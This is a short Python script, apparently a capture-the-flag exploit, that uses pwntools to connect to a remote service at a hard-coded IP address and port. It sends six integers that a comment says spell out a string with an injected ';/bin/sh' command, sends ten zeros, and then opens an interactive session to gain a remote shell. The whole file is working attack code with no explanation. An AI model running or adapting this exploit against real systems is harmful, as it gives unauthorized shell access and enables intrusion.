from pwn import *
io=remote('112.6.51.212',32537)


io.sendline(b'1851880825')
io.sendline(b'1852139635')
io.sendline(b'1684631852')
io.sendline(b'560426607')
io.sendline(b'1768042299')
io.sendline(b'1752379246')
#输入yuanshenqidong!;/bin/sh\x00
for i in range(10):
    io.sendline(b'0')
io.interactive()
